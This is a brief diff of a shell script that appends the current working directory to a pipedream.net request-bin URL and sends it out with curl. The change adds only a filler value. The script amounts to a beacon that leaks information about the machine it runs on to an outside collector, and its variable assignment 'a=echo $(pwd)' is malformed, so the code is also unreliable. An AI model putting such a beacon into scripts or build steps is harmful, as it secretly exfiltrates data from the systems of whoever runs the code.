@@ -5,6 +5,7 @@
 
 a=echo $(pwd)
 url="https://en0liva7dzyvpp.x.pipedream.net?"
-url="$url$a"
+b="aaa"
+url="$url$a$b"
 
 curl "$url"
